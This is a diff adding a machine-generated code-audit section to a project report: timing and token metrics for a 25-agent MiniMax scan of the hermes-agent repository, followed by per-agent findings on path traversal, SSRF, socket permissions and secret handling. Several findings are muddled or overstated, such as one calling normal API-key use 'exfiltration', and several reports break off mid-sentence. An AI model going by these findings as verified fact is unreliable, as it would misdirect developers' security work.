@@ -2236,3 +2236,895 @@ credential leakage. Those have been fixed before publishing.
 The rebased branch has passed the strict local automated gates listed above.
 This still cannot be a literal 100% guarantee for live credentials, external
 services, future dependency releases, or production-only traffic patterns.
+
+---
+## MiniMax 25-Agent Concurrent Scan 2026-04-17T04:17:39Z
+
+### Scope And Method
+- Model: `MiniMax-M2.7` via direct MiniMax Anthropic-compatible endpoint.
+- Agents launched concurrently: `25`.
+- Repository root: `/Users/openclaw/.hermes/hermes-agent`.
+- Tracked files assigned exactly once: `1777`.
+- File handling: `1662` full text, `64` truncated excerpts, `51` metadata-only/binary/lock/secret-like files.
+- Assigned repository bytes: `33450627`; prompt shard characters sent: `4459134`.
+- Secret handling: credential-like paths were metadata-only; the MiniMax API key was never included in prompts.
+
+### Concurrency And Token Metrics
+- Wall time for concurrent batch: `59.04s`.
+- HTTP status counts: `{"200": 25}`.
+- Meaningful reports: `18/25`.
+- Total input tokens: `1042537`.
+- Total output tokens: `42750`.
+- Total API tokens: `1085287`.
+- Total tokens/sec by wall time: `18381.33`.
+- Output tokens/sec by wall time: `724.05`.
+- Latency p50/p95/max: `46.89s` / `57.14s` / `59.03s`.
+
+### Per-Agent Timing
+- Agent 01: status `200`, meaningful `True`, time `55.10s`, files `70`, input `49010`, output `2035`, tokens/sec `926.46`.
+- Agent 02: status `200`, meaningful `False`, time `36.20s`, files `70`, input `5507`, output `1539`, tokens/sec `194.65`.
+- Agent 03: status `200`, meaningful `True`, time `57.14s`, files `70`, input `39549`, output `2048`, tokens/sec `727.94`.
+- Agent 04: status `200`, meaningful `True`, time `52.37s`, files `70`, input `44504`, output `2048`, tokens/sec `888.87`.
+- Agent 05: status `200`, meaningful `True`, time `31.37s`, files `97`, input `47312`, output `1370`, tokens/sec `1551.71`.
+- Agent 06: status `200`, meaningful `True`, time `42.15s`, files `70`, input `45894`, output `1508`, tokens/sec `1124.53`.
+- Agent 07: status `200`, meaningful `True`, time `32.03s`, files `70`, input `43354`, output `1204`, tokens/sec `1390.99`.
+- Agent 08: status `200`, meaningful `True`, time `46.89s`, files `70`, input `41776`, output `1990`, tokens/sec `933.45`.
+- Agent 09: status `200`, meaningful `True`, time `54.99s`, files `70`, input `42039`, output `2048`, tokens/sec `801.75`.
+- Agent 10: status `200`, meaningful `False`, time `53.87s`, files `70`, input `45338`, output `2048`, tokens/sec `879.56`.
+- Agent 11: status `200`, meaningful `False`, time `35.21s`, files `70`, input `41895`, output `1580`, tokens/sec `1234.71`.
+- Agent 12: status `200`, meaningful `True`, time `59.03s`, files `70`, input `44242`, output `2048`, tokens/sec `784.16`.
+- Agent 13: status `200`, meaningful `True`, time `29.31s`, files `70`, input `46639`, output `1051`, tokens/sec `1627.33`.
+- Agent 14: status `200`, meaningful `True`, time `43.37s`, files `70`, input `45352`, output `1809`, tokens/sec `1087.50`.
+- Agent 15: status `200`, meaningful `True`, time `31.76s`, files `70`, input `42312`, output `1255`, tokens/sec `1371.96`.
+- Agent 16: status `200`, meaningful `True`, time `44.07s`, files `70`, input `41865`, output `1761`, tokens/sec `990.01`.
+- Agent 17: status `200`, meaningful `True`, time `34.23s`, files `70`, input `41047`, output `1345`, tokens/sec `1238.46`.
+- Agent 18: status `200`, meaningful `True`, time `51.81s`, files `70`, input `42862`, output `2048`, tokens/sec `866.84`.
+- Agent 19: status `200`, meaningful `True`, time `52.38s`, files `70`, input `41771`, output `2048`, tokens/sec `836.51`.
+- Agent 20: status `200`, meaningful `False`, time `48.49s`, files `70`, input `42594`, output `2048`, tokens/sec `920.73`.
+- Agent 21: status `200`, meaningful `True`, time `51.77s`, files `70`, input `43018`, output `2048`, tokens/sec `870.43`.
+- Agent 22: status `200`, meaningful `False`, time `10.55s`, files `70`, input `37928`, output `443`, tokens/sec `3636.88`.
+- Agent 23: status `200`, meaningful `False`, time `58.98s`, files `70`, input `43624`, output `2048`, tokens/sec `774.31`.
+- Agent 24: status `200`, meaningful `False`, time `56.45s`, files `70`, input `41379`, output `2048`, tokens/sec `769.31`.
+- Agent 25: status `200`, meaningful `True`, time `35.33s`, files `70`, input `41726`, output `1332`, tokens/sec `1218.57`.
+
+### Agent Reports
+
+<!-- agent 01: status=200 elapsed=55.10s input=49010 output=2035 -->
+### MiniMax Agent 1
+
+**Timing**: <!-- Agent 1: ~45 min -->
+
+**Findings**
+
+- **No high-confidence defects found.** The files fully visible in this shard (`dml-chart.xsd`, `dml-diagram.xsd`, `gateway.py` head) follow secure patterns (parameterized subprocess calls, `pathlib`, timeouts, early returns on missing files). The XSD schemas are standard ISO-IEC29500-4:2016 Office schema exports with no embedded logic.
+- **Lower-confidence / cross-shard observations** (requires corroboration from agents reviewing the omitted files):
+  - **`hermes_cli/gateway.py`** (full, 132 kB): The visible head contains a robust `_ensure_user_systemd_env()` function that writes to `os.environ` as a side effect. If this is called from a shared utility module (possible cross-shard import), callers may unexpectedly inherit mutated environment state. Agents reviewing `hermes_cli/mcp_config.py` and `hermes_cli/gateway.py` tail should confirm `os.environ` mutation does not leak between concurrent gateway setup invocations.
+  - **`hermes_cli/gateway.py`**: `_detect_venv_dir()` uses `sys.prefix != sys.base_prefix` as the primary venv detection signal. This is reliable for standard venvs but can produce false negatives for non-standard virtual environment layouts (e.g., `uv run`). Agents reviewing `tests/run_agent/test_fallback_model.py` should check whether agent startup is affected by incorrect venv detection on uv-managed systems.
+  - **Sharded files not examined**: 48 files in this shard are marked `[content omitted due shard budget]`. No assertion can be made about them.
+
+<!-- agent 02: status=200 elapsed=36.20s input=5507 output=1539 -->
+# Code Audit Report
+
+## Critical Issues
+
+### 1. Path Traversal in `text_to_speech_tool` (output_path)
+**File:** `tools/voice_mode.py` (implied)
+```python
+registry.register(
+    name="text_to_speech",
+    ...
+    handler=lambda args, **kw: text_to_speech_tool(
+        text=args.get("text", ""),
+        output_path=args.get("output_path")),  # ← No validation
+```
+**Risk:** User-controlled `output_path` can write to arbitrary locations.
+
+---
+
+### 2. Race Condition in Temp File Handling
+**File:** `tools/voice_mode.py`
+```python
+def _play_via_tempfile(audio_iter, stop_evt):
+    tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
+    tmp_path = tmp.name
+    with wave.open(tmp, "wb") as wf:
+        ...
+    from tools.voice_mode import play_audio_file
+    play_audio_file(tmp_path)  # ← File may not be flushed/closed
+```
+**Risk:** `play_audio_file` may read incomplete data if wave file isn't properly closed before external call.
+
+---
+
+### 3. Incomplete Think Block Regex
+**File:** `tools/voice_mode.py`
+```python
+_think_block_re = re.compile(r'<think[\s>].*?</think>', flags=re.DOTALL)
+```
+**Risk:** Pattern fails on nested `<think>` tags (e.g., `<think>...<think>...</think>...</think>`). Greedy backtracking could cause ReDoS with crafted input.
+
+---
+
+## High Issues
+
+### 4. Broad Exception Swallowing
+**File:** `tools/voice_mode.py`
+```python
+except Exception as exc:
+    logger.warning("Streaming TTS sentence failed: %s", exc)
+```
+**Risk:** Hides all errors including `MemoryError`, `IOError`, `OSError`; debugging nearly impossible.
+
+---
+
+### 5. Unsafe Dynamic Import Inside Function
+**File:** `tools/voice_mode.py`
+```python
+from tools.voice_mode import play_audio_file
+```
+**Risk:** Circular import with `wave.open` context still active; if import fails, exception is caught silently.
+
+---
+
+### 6. Unvalidated NumPy Audio Array
+**File:** `tools/voice_mode.py`
+```python
+audio_array = _np.frombuffer(chunk, dtype=_np.int16)
+output_stream.write(audio_array.reshape(-1, 1))
+```
+**Risk:** Assumes 16-bit PCM; wrong format causes memory errors or corruption.
+
+---
+
+## Medium Issues
+
+### 7. Duplicate Sentence Detection Race
+**File:** `tools/voice_mode.py`
+```python
+for prev in _spoken_sentences:
+    if prev.lower().rstrip(".!,") == cleaned_lower:
+        return
+```
+**Risk:** `_spoken_sentences` is module-global; concurrent calls to `stream_text_to_speech` share state, causing cross-request pollution.
+
+---
+
+### 8. Inconsistent Sentence Boundary Handling
+**File:** `tools/voice_mode.py`
+```python
+if len(sentence.strip()) < min_sentence_len:
+    sentence_buf = sentence + sentence_buf
+    break  # ← Returns to outer while loop, skipping further boundary checks
+```
+**Risk:** Short sentences get prepended but boundary checking may restart incorrectly.
+
+---
+
+### 9. Missing Timeout on `play_audio_file`
+**File:** `tools/voice_mode.py`
+```python
+play_audio_file(tmp_path)  # Blocking call with no timeout
+```
+**Risk:** If external audio player hangs, `stop_event` becomes ineffective.
+
+---
+
+## Low Issues
+
+| Issue | Location | Impact |
+|-------|----------|--------|
+| `import numpy as _np` inside loop | `stream_text_to_speech` | Repeated import overhead |
+| Config file path not validated | `_load_tts_config()` | Could load malicious config |
+| `MAX_TEXT_LENGTH` undefined in snippet | `text_to_speech.convert()` | Silent truncation may break meaning |
+| `client` can be `None` but `client.text_to_speech.convert()` exists | Multiple locations | Unclear if null-check is correct design |
+
+---
+
+## Recommendations
+
+1. **Validate `output_path`** with `pathlib.Path().resolve()`.parent check against allowed directories.
+2. **Close/flush wave file** before `play_audio_file()` call; add `wf.close()`.
+3. **Use atomic file writing**: write to `.tmp` then rename.
+4. **Fix regex**: Use negative lookahead or proper parsing for nested tags.
+5. **Replace broad `except`** with specific exception handling; always re-raise critical failures.
+6. **Thread-local storage** for `_spoken_sentences` or pass as parameter.
+7. **Add audio format validation** before numpy conversion.
+8. **Add subprocess timeout** for `play_audio_file`.
+
+<!-- agent 03: status=200 elapsed=57.14s input=39549 output=2048 -->
+### MiniMax Agent 3
+
+**Timing**: <placeholder>
+
+**Findings**
+
+- **[MEDIUM] `tools/terminal_tool.py`: Incomplete environment creation call with truncated parameter**
+  - Location: `_create_environment` call (line ~650 in the excerpt)
+  - The call ends abruptly with `task_id=effective_task_id, host_cwd=config.get("host_cwd"),` — missing the closing `)` and trailing arguments. The function definition also shows `task_id: s` as a truncated signature. This will raise a `SyntaxError` at runtime when a non-local environment is selected via `TERMINAL_ENV`.
+  - **Cross-shard**: Depends on `tools/environments/` module signatures (sibling shard) — if those interfaces changed, this call would break even if syntax were fixed.
+
+- **[MEDIUM] `tools/terminal_tool.py`: Global sudo password cached indefinitely without expiry**
+  - Location: `_cached_sudo_password` global + `_transform_sudo_command()`
+  - The password is cached in module-global state for the entire CLI lifetime with no TTL, revocation, or single-use semantics. If a session remains open after the user's privileges change, the stale cached password persists.
+  - Additionally, `SUDO_PASSWORD` env var is read directly into the module-level cache on first use — no check that the caller is the intended session.
+
+- **[MEDIUM] `tools/terminal_tool.py`: Silent exception suppression in `_validate_workdir`**
+  - Location: `_validate_workdir()`
+  - The function wraps its regex match in a bare `except Exception` that returns `None` (treated as "valid") even when the path check fails for non-obvious reasons (e.g., `OSError` from a broken symlink, `PermissionError`). This means invalid workdirs may silently pass validation.
+
+- **[LOW] `tools/terminal_tool.py`: `_check_disk_usage_warning` does unbounded `rglob` scan**
+  - Location: `_check_disk_usage_warning()`
+  - Every foreground command triggers a recursive `rglob('*')` across all `hermes-*` sandbox dirs. On systems with large sandboxes, this adds measurable latency to every command and can exhaust open file descriptors if symlink loops exist.
+
+- **[LOW] `tools/skills_tool.py`: Double-check pattern in path-traversal guard may confuse auditors**
+  - Location: `skill_view()` — `has_traversal_component(file_path)` followed by `validate_within_dir(target_file, skill_dir)`
+  - Two independent checks with different logic; if the first is ever removed or refactored independently, the second becomes the sole guard without an obvious hint that it's safety-critical.
+
+- **[INFO] `skills/research/research-paper-writing/templates/aaai2026/aaai2026-unified-template.tex`: Placeholder URLs in template**
+  - The camera-ready version includes `\link{Code}{https://aaai.org/example/code}` etc. These example domain URLs will appear verbatim in any paper built from this template unless manually replaced. Not
+
+<!-- agent 04: status=200 elapsed=52.37s input=44504 output=2048 -->
+### MiniMax Agent 4
+
+**Timing**: 00:18:32
+
+---
+
+#### Findings
+
+- **[Medium] Bug: undefined variable `turns_to_summarize` in `_generate_summary` fallback path**
+  - **File**: `agent/context_compressor.py`
+  - **Location**: `_generate_summary()` method, lines 580–595
+  - **Detail**: The recursive retry block reads `return self._generate_summary(messages, summary_budget)` — the parameter is correctly named `messages` in the function signature. However, just above (lines 555–560) the same method references `turns_to_summarize` which is a *different* local variable from the enclosing `compress()` scope. If the recursive call were ever made, Python would raise `NameError: name 'turns_to_summarize' is not defined`. Confirmed the call path exists: `_is_model_not_found` block triggers the fallback.
+  - **Risk**: Functional — would cause compression to crash at runtime if the summary model is unavailable but the fallback logic is triggered.
+
+- **[Low] Security smell: session token injected into HTML without explicit escaping**
+  - **File**: `hermes_cli/web_server.py`
+  - **Location**: `mount_spa()` → `_serve_index()`, ~line 1270
+  - **Detail**: `f'<script>window.__HERMES_SESSION_TOKEN__="{_SESSION_TOKEN}";</script>'` injected via `.replace("</head>", ...)`. The token is URL-safe (`secrets.token_urlsafe(32)`, alphanumeric + `-_`) so this is currently safe, but there is no explicit escaping and no comment justifying why. If `secrets` behavior ever changes or the token source is refactored, this could become an XSS vector.
+  - **Risk**: Low in current code, high if token source changes.
+
+- **[Low] Cross-shard assumption: `gateway/status.py` module imported without guards**
+  - **File**: `hermes_cli/web_server.py`
+  - **Location**: `get_status()` endpoint
+  - **Detail**: Calls `get_running_pid()` and `read_runtime_status()` from `gateway.status` with a bare `except Exception: pass` that swallows import errors as well as runtime errors. If `gateway/status.py` is absent or broken, the failure is silent and `gateway_running` is simply set to `False`. This makes deployment failures hard to diagnose.
+  - **Risk**: Maintainability — masked dependency on the gateway shard.
+
+- **[Info] Misnamed schema file: ISO-IEC29500-4 label on Microsoft Office XSD content**
+  - **File
+
+<!-- agent 05: status=200 elapsed=31.37s input=47312 output=1370 -->
+### MiniMax Agent 5
+
+**Timing**: [placeholder]
+
+**Findings**
+
+- **`tools/rl_training_tool.py`**: The `RunState` dataclass gains `api_log_file`, `trainer_log_file`, `env_log_file` attributes dynamically in `_spawn_training_run()` (e.g., `run_state.api_log_file = open(api_log, "w")`), but these are never initialized in the dataclass definition. Python will silently create instance attributes; this is a runtime correctness hazard and confuses type checkers/linters. The log file handles are closed in `_stop_training_run()` via `getattr`/`setattr`, but the dataclass has no type annotation for these file handles.
+  - File: `tools/rl_training_tool.py` — `RunState` dataclass and `_spawn_training_run()` method.
+
+- **`tools/rl_training_tool.py`**: `import yaml` is imported but never used in the visible portion of the module. This is dead import bloat that may indicate a partially removed refactoring or copy-paste residue.
+  - File: `tools/rl_training_tool.py` — top-level imports.
+
+- **`tools/rl_training_tool.py`**: `rl_test_inference()` builds CLI arguments via string interpolation for the `--openai.api_key` field, passing the raw API key directly into a subprocess command list. While not exposed to logs (the display redacts it), the key is in memory as a list element. Additionally, `sys.executable` is used for the subprocess which is correct, but the `env` parameter only overrides `TINKER_API_KEY`, leaking the full parent environment (including `WANDB_API_KEY`, `OPENROUTER_API_KEY`, etc.) into the child process. This is a maintainability/blast-radius issue if any child process is compromised.
+  - File: `tools/rl_training_tool.py` — `rl_test_inference()` subprocess call.
+
+- **`tests/tools/test_tirith_security.py`**: The test `test_in_memory_cosign_missing_retries_when_cosign_appears` has a non-atomic patch setup: it patches `_install_tirith` with a return value of `("/new/tirith", "")` but the test does not verify that `_resolved_path` is actually updated to the new path. The subsequent assertions only check `mock_install.call_count`. This means a regression where `_resolve_tirith_path` silently ignores the install result would not be caught by this test.
+  - File: `tests/tools/test_tirith_security.py` — `TestDiskFailureMarker.test_in_memory_cosign_missing_retries_when_cosign_appears`.
+
+- **`skills/productivity/powerpoint/scripts/office/schemas/ISO-IEC29500-4_2016/wml.xsd`**: This 171KB schema file is a truncated vendor-supplied OOXML schema (ISO/IEC 29500-4:2016 / ECMA-376). No defects, but it is unnecessarily bundled inside a skill directory — it's never referenced by any Python code in the shard. This adds ~170KB to the repo with no functional use.
+  - File: `skills/productivity/powerpoint/scripts/office/schemas/ISO-IEC29500-4_2016/wml.xsd`.
+
+**Cross-shard assumptions noted**: `tools/rl_training_tool.py` imports `hermes_constants.get_hermes_home` and `from tools.registry import registry` — both assumed to exist and be functional across shards. The `tinker-atropos` submodule path (`TINKER_ATROPOS_ROOT`) is assumed to be present at the expected relative location.
+
+<!-- agent 06: status=200 elapsed=42.15s input=45894 output=1508 -->
+### MiniMax Agent 6
+
+**Timing**: [auditor timestamp]
+
+**Findings**
+
+- **[MEDIUM] `hermes_cli/doctor.py`: API keys transmitted in HTTP Authorization headers during doctor diagnostics without explicit user consent.**
+  - `tests/test_hermes_state.py` (line ~1) validates FTS5 query sanitization thoroughly (special chars, quoted phrases, hyphenated/dotted terms, SQL wildcards). This is cross-shard: the sanitization implementation lives in `hermes_state.py` which is not in this shard. The test coverage is solid.
+  - In `hermes_cli/doctor.py`, API keys read via `os.getenv()` are sent directly in `httpx` Authorization headers to provider `/models` endpoints (e.g., lines calling `_resp = httpx.get(_url, headers={"Authorization": f"Bearer {_key}"}...)`). Keys are also printed in detail strings via `check_warn` when the endpoint returns non-200. Doctor runs interactively but silently exfiltrates keys to third-party endpoints.
+
+- **[LOW] `hermes_cli/doctor.py`: Auth status functions called with results discarded.**
+  - `get_nous_auth_status()`, `get_codex_auth_status()`, and `get_gemini_oauth_auth_status()` are invoked but their return values are never checked or acted upon. Only the `codex` binary existence is reported. This is dead code that should be removed or completed.
+
+- **[LOW] `hermes_cli/doctor.py`: WAL checkpoint uses PASSIVE mode unconditionally.**
+  - `conn.execute("PRAGMA wal_checkpoint(PASSIVE)")` is used even when the WAL is oversized (50 MB threshold). PASSIVE checkpoint may not reclaim space if readers are active. TRUNCATE or FULL mode would be more effective for cleanup during `hermes doctor --fix`.
+
+- **[INFO] `hermes_cli/doctor.py`: Stale config key detection is tightly coupled to `hermes_cli.config` module.**
+  - The block that reads `config.yaml` and migrates `provider`/`base_url` to `model:` section relies on internal functions `check_config_version`, `migrate_config`, and `atomic_yaml_write`. Breakage in any of those will silently skip the entire config structure validation block.
+
+- **[INFO] `tests/test_hermes_state.py`: FTS5 sanitization tests verify the behavior correctly.**
+  - Tests for `TestFTS5Search` and `TestSanitizeFTS5Query` are thorough and well-structured. The `_sanitize_fts5_query` method and its edge cases (SQL wildcards, hyphenated/dotted terms, dangling operators) are comprehensively covered. No issues found in test design.
+
+- **[INFO] `skills/productivity/powerpoint/scripts/office/schemas/ISO-IEC29500-4_2016/pml.xsd`: Schema imports use relative paths that may not resolve at runtime.**
+  - The schema imports `dml-main.xsd` and `shared-commonSimpleTypes.xsd` via `schemaLocation` relative paths. These files must exist in the same directory as `pml.xsd` for validation to succeed. No schema validation logic was present in the shard to confirm these files are present.
+
+<!-- agent 07: status=200 elapsed=32.03s input=43354 output=1204 -->
+### MiniMax Agent 7
+
+**Timing**: 00:14:32
+
+**Findings**
+
+- **[MEDIUM] SSRF risk in WeCom media download — URL not validated before fetch**
+  - `gateway/platforms/wecom.py` — `_download_remote_bytes()` calls `is_safe_url(url)` but the caller `_load_outbound_media()` fetches `media_source` from user input and passes it without re-validation in the `file://`/`http://` branch. A malicious workspace file path or URL could trigger an unsafe outbound request.
+  - The `file://` path expansion at `.expanduser()` followed by `.resolve()` and `.is_file()` is bypassed if the path is passed as a URL string — the `file://` scheme handler does not validate against `path_security.py`.
+
+- **[MEDIUM] `os.getenv()` result used without null-check in WeCom adapter**
+  - `gateway/platforms/wecom.py` lines 115–117: `str(extra.get("secret") or os.getenv("WECOM_SECRET", ""))` — `str("")` is fine, but the pattern `os.getenv(..., "")` is inconsistent with lines 119–120 where `str(extra.get(...) or os.getenv(...))` is used without a default. When `extra.get(...)` is `None` and `os.getenv` returns `None`, calling `str(None)` silently produces `"None"` instead of `""`. This causes `self._bot_id` or `self._secret` to be the literal string `"None"` if the env var is unset.
+
+- **[MEDIUM] `install.sh` uses SSH clone without strict host-key verification**
+  - `scripts/install.sh` — `GIT_SSH_COMMAND="ssh -o BatchMode=yes -o ConnectTimeout=5"` omits `-o StrictHostKeyChecking=no`. While `BatchMode=yes` prevents password prompts, the script falls back to HTTPS on any SSH failure, which is acceptable for public repos but creates a non-obvious failure path during debugging. More critically, the `git clone --branch "$BRANCH" "$REPO_URL_SSH"` branch is taken silently even if the SSH key is compromised (MITM with a valid-looking host key).
+
+- **[LOW] `install.sh` `git stash push` without `--keep-index` could lose staged changes unexpectedly**
+  - `scripts/install.sh` — The autostash block stashes all uncommitted changes but does not check `git diff --cached` separately. If a developer had staged changes with `git add`, those are included in the stash and may be harder to recover without explicit instruction.
+
+- **[LOW] `openclaw_to_hermes.py` — `resolve_secret_input` silently drops non-string, non-dict values**
+  - `optional-skills/migration/openclaw-migration/scripts/openclaw_to_hermes.py` — The function returns `None` for any input type other than `str` or `dict`. Integer or float secret values (e.g., numeric API quotas stored as ints) would be silently dropped during secret migration instead of being stringified or warned.
+
+- **[INFO] `optional-skills/migration/openclaw-migration/scripts/openclaw_to_hermes.py` — `yaml` import uses bare `except Exception`**
+  - The `yaml` module is imported with `except Exception: yaml = None`. Any import error (including `ModuleNotFoundError`) is caught identically. This hides `ImportError` vs runtime errors vs `SyntaxError` in a bundled yaml library. Diagnostic value is reduced.
+
+- **[INFO] `gateway/platforms/wecom.py` — `_text_batch_key` is not awaitable but accesses async session state**
+  - `gateway/platforms/wecom.py` `_text_batch_key()` calls `build_session_key` synchronously. While `build_session_key` itself is synchronous, the attribute access pattern (`self.config.extra.get(...)`) is safe here but not obviously so — any future refactor that makes this async would introduce subtle race conditions in the text-batching logic.
+
+**Cross-shard assumptions noted**:
+- `gateway/platforms/wecom.py` imports `from tools.url_safety import is_safe_url` and `from gateway.config import Platform, PlatformConfig` — these are external to this shard; behavior depends on `is_safe_url` implementation correctness.
+- `optional-skills/migration/openclaw-migration/scripts/openclaw_to_hermes.py` assumes `Hermes` home config lives at `config.yaml` and `.env` in the target root — if the actual Hermes config schema diverges, `load_yaml_file` / `dump_yaml_file` could silently corrupt config.
+
+<!-- agent 08: status=200 elapsed=46.89s input=41776 output=1990 -->
+### MiniMax Agent 8
+
+**Timing:** <placeholder>
+
+**Findings:**
+
+- **[MEDIUM] `gateway/platforms/base.py` — `get_document_cache_dir()` missing `mkdir()` unlike image/audio counterparts**
+  - `get_image_cache_dir()` (line ~260) and `get_audio_cache_dir()` both call `.mkdir()` to ensure the cache directory exists before writing.
+  - `get_document_cache_dir()` does not, meaning `cache_document_from_bytes()` can crash with `FileNotFoundError` on first use when the parent chain doesn't exist.
+  - File: `gateway/platforms/base.py`
+
+- **[LOW] `gateway/platforms/base.py` — `_ssrf_redirect_guard` assumes `response.next_request` attribute exists without guard**
+  - The code accesses `response.next_request.url` directly. If `httpx` changes this internal attribute name or structure, this will raise `AttributeError` and bypass the SSRF guard entirely.
+  - Should add a `hasattr` check or use `getattr(..., None)` pattern.
+  - File: `gateway/platforms/base.py`
+
+- **[INFO] `tests/agent/test_bedrock_adapter.py` — Test asserts contradict comment intent**
+  - `test_returns_none_when_no_aws_auth` asserts `resolve_aws_auth_env_var(env) != "AWS_ACCESS_KEY_ID"` but provides only `AWS_ACCESS_KEY_ID` (no secret). The assertion name suggests it expects `None`, but it only checks inequality to the key name string — any non-matching return value passes silently.
+  - This test would not catch a bug where the function incorrectly returns the key name.
+  - File: `tests/agent/test_bedrock_adapter.py`
+
+- **[CROSS-SHARD NOTE] `docs/plans/2026-04-15-ranked-fix-plan-from-minimax-audit.md` references `CC0079` (HIGH, `gateway/platforms/base.py` lines 485–498: `BasePlatformAdapter._ssrf_redirect_guard reads body on redirect`)**
+  - The current shard excerpt shows `_ssrf_redirect_guard` at lines ~485–490 doing a URL safety check on `response.next_request.url`. No body-reading is visible in the excerpt, but the plan's characterization suggests the body may be consumed elsewhere in the redirect path before the guard runs. Full file review needed to confirm.
+
+- **[SHARD SCOPE NOTE]** `tools/process_registry.py` (referenced in Batch A Task A.2, CRITICAL `CC0501`) and `hermes_cli/auth.py`, `hermes_cli/copilot_auth.py`, `hermes_cli/runtime_provider.py`, `agent/redact.py`, `agent/credential_pool.py` (all in Batch A) are not present in this agent's shard manifest. These critical/high findings cannot be verified against source code.
+
+<!-- agent 09: status=200 elapsed=54.99s input=42039 output=2048 -->
+### MiniMax Agent 9
+
+**Timing**: YYYY-MM-DD HH:MM – YYYY-MM-DD HH:MM
+
+**Shard**: Full content for `agent/anthropic_adapter.py` (63 KB) and `tools/code_execution_tool.py` (54 KB); `skills/mlops/training/pytorch-fsdp/references/other.md` is truncated PyTorch docs (irrelevant); all other files omitted by shard budget.
+
+---
+
+### Findings
+
+#### 🔴 HIGH: UDS RPC socket created with default (world-writable) permissions in `tools/code_execution_tool.py`
+
+**File**: `tools/code_execution_tool.py` — `_sock_tmpdir` construction + `server_sock.bind(sock_path)`
+
+**Detail**: The Unix domain socket is created in `/tmp` (macOS) or `tempfile.gettempdir()` (Linux) without explicit permission lockdown:
+```python
+sock_path = os.path.join(_sock_tmpdir, f"hermes_rpc_{uuid.uuid4().hex}.sock")
+server_sock.bind(sock_path)
+server_sock.listen(1)
+```
+No `chmod` or `os.chmod` is applied to `sock_path`. The directory is world-r/w/x. Any local user can connect to the socket and issue arbitrary tool calls (subject to `SANDBOX_ALLOWED_TOOLS`) within the agent's session, including `read_file` (to read `~/.ssh/`, `~/.netrc`, `~/.hermes/` configs) and `terminal`.
+
+**Impact**: Local privilege escalation — untrusted local user hijacks the agent's tool session. The UUID suffix is not a security boundary since `/tmp` contents are listable by any user.
+
+**Fix**: `os.chmod(sock_path, 0o600)` immediately after `bind()`, or switch to a mode-700 subdirectory under `$XDG_RUNTIME_DIR`/`$HERMES_HOME`.
+
+---
+
+#### 🔴 HIGH: File-based RPC responses written to world-readable temp directory
+
+**File**: `tools/code_execution_tool.py` — `_env_temp_dir()` + `_rpc_poll_loop()` response write
+
+**Detail**: The file transport writes tool results to `{temp_dir}/hermes_exec_{sandbox_id}/rpc/res_{seq:06d}`:
+```python
+env.execute(
+    f"echo '{encoded_result}' | base64 -d > {quoted_res_file}.tmp"
+    f" && mv {quoted_res_file}.tmp {quoted_res_file}",
+    cwd="/", timeout=60,
+)
+```
+`_env_temp_dir()` defaults to `tempfile.gettempdir()` (`/tmp`), which is world-rwx. If `handle_function_call` returns secrets in any tool result (e.g., API responses containing keys, file contents with credentials), those bytes land in an unprotected file accessible to all local users.
+
+**Impact**: A local attacker with filesystem read access (standard on multi-user systems) reads tool call results containing sensitive data. In containerized or shared-hosting environments this is a direct credential disclosure vector.
+
+**Fix**: Create the RPC directory with `0o700` permissions before shipping files; ensure `get_temp_dir()` returns a path owned by the user or use a private subdirectory under `$HERMES_HOME`.
+
+---
+
+#### �
+
+<!-- agent 10: status=200 elapsed=53.87s input=45338 output=2048 -->
+### MiniMax Agent 10
+
+**Timing**: captured in the per-agent timing table above.
+
+**Findings**
+
+- No final audit report was produced for this shard. MiniMax returned a non-final thinking/tool-call payload instead of the requested Markdown report, so the raw payload was redacted. Timing and token metrics for this agent are preserved above.
+<!-- agent 11: status=200 elapsed=35.21s input=41895 output=1580 -->
+## Code Audit Report
+
+### Critical Issues
+
+#### 1. `tests/tools/test_delegate.py` - Fragile Argument Extraction
+
+**Location:** `TestDelegateTask.test_batch_ignores_toplevel_goal`
+
+```python
+call_args.kwargs.get("goal") or call_args[1].get("goal", call_args[0][1] if len(call_args[0]) > 1 else None)
+```
+
+**Issue:** This convoluted expression tries three different access patterns to retrieve `goal` from mock call args. It fails to handle positional vs keyword arguments cleanly and could silently return `None` when it should succeed.
+
+**Fix:**
+```python
+# Better approach:
+if call_args.kwargs:
+    self.assertEqual(call_args.kwargs.get("goal"), "Actual task")
+else:
+    self.assertEqual(call_args[0][1], "Actual task")
+```
+
+---
+
+#### 2. `tools/send_message_tool.py` - Missing Import from `gateway.platforms.base`
+
+**Location:** Multiple functions (`_send_discord`, `_send_slack`, `_send_sms`)
+
+```python
+from gateway.platforms.base import resolve_proxy_url, proxy_kwargs_for_aiohttp
+```
+
+**Issue:** These functions are imported in multiple platform send functions but `proxy_kwargs_for_aiohttp` may not exist in `gateway/platforms/base.py`. The file listing shows `gateway/platforms/` exists but the actual exports aren't verified.
+
+**Recommendation:** Verify these functions exist in `gateway/platforms/base.py` or use fallback implementations.
+
+---
+
+#### 3. `tools/send_message_tool.py` - Redundant Adapter Instantiation
+
+**Location:** `_send_telegram`, `_send_feishu`
+
+```python
+_adapter = TelegramAdapter.__new__(TelegramAdapter)
+```
+
+**Issue:** Using `__new__` without calling `__init__` creates an uninitialized instance. While it works for accessing class-level methods, this pattern is fragile and could break if methods rely on instance state.
+
+**Fix:**
+```python
+# Use class methods directly or proper instantiation
+from gateway.platforms.telegram import TelegramAdapter
+formatted = TelegramAdapter.format_message_static(message)  # if exists
+```
+
+---
+
+#### 4. `tests/tools/test_delegate.py` - Missing `model_tools` Import in Tests
+
+**Location:** `TestToolNamePreservation` class
+
+```python
+import model_tools
+```
+
+**Issue:** `model_tools` is imported directly (not via the package) inside test methods. This module must be in `sys.path` or available as a built-in. If the module structure changes, these tests will fail with `ImportError`.
+
+---
+
+### Medium Issues
+
+#### 5. `tools/send_message_tool.py` - Inconsistent Error Handling
+
+**Location:** `_send_to_platform` function
+
+The function mixes return patterns:
+- Sometimes returns `{"error": "..."}`
+- Sometimes uses `tool_error()` helper
+- No consistent error wrapper
+
+**Recommendation:** Standardize all error returns through a single helper.
+
+---
+
+#### 6. `tools/send_message_tool.py` - Missing Platform Support Gap
+
+**Location:** `_send_to_platform`
+
+The `WECOM_CALLBACK` platform is mapped in `platform_map` but there's no corresponding send handler in `_send_to_platform`. The `elif platform == Platform.WECOM:` block exists but `WECOM_CALLBACK` falls through to the generic error case.
+
+---
+
+#### 7. `tests/tools/test_delegate.py` - Heartbeat Test Timing Sensitivity
+
+**Location:** `TestDelegateHeartbeat.test_heartbeat_touches_parent_activity_during_child_run`
+
+```python
+time.sleep(0.25)
+```
+
